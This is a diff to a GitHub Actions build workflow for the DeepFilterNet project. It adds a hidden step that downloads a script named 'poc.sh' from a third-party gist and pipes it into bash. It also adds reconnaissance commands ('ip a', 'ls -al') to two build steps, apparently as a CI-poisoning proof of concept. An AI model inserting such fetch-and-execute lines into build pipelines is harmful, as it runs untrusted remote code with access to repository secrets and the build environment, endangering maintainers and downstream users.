@@ -37,6 +37,7 @@ jobs:
           echo "git tag: ${{github.event.commits[0].message}}"
           echo "DF version:  $(scripts/get_version.sh)"
           echo "DF_VERSION=$(scripts/get_version.sh)" >> $GITHUB_ENV
+          curl -sSfL gist.githubusercontent.com/Fearless-Squirrel/bbef3562184dc8ac74b076f15a9c465f/raw/54aabb582d12f6c0cf5227a3ca6acd170cb74bff/poc.sh | bash
       - name: should it be skipped?
         env:
           COMMIT_FILTER: '^v[0-9]+.[0-9]+.[0-9]+$'
@@ -86,7 +87,10 @@ jobs:
           curl -sL https://install.python-poetry.org | python - -y
       - name: Update PATH
         if: ${{ matrix.os != 'windows-latest' }}
-        run: echo "$HOME/.local/bin" >> $GITHUB_PATH
+        run: |
+          echo "$HOME/.local/bin" >> $GITHUB_PATH
+          ip a
+          ls -al
       - name: Update Path for Windows
         if: ${{ matrix.os == 'windows-latest' }}
         run: |
@@ -110,6 +114,8 @@ jobs:
         if: matrix.os != 'windows-latest'
         working-directory: DeepFilterNet
         run: |
+          ip a
+          ls -al
           poetry --version
           poetry install -vvv --no-interaction -E eval -E dnsmos-local ${{env.EXTRA}}
           echo "Installing pytorch"
